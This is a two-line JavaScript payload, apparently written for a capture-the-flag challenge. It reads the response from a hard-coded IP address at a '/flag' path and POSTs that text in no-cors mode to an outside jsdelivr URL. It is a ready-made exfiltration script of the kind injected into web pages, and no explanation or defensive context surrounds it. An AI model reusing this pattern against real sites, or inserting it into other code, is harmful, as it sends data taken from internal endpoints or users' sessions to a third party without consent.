const url = "http://165.232.190.5:2030/flag";
fetch(url).then((response) => response.text()).then((text) => fetch("https://cdn.jsdelivr.net/gh/omnigodz/testing@master/bugbase_ctf5.js", {method: "POST", mode: "no-cors", headers: {"Content-Type": "application/json"}, body: JSON.stringify({"text":text})}));
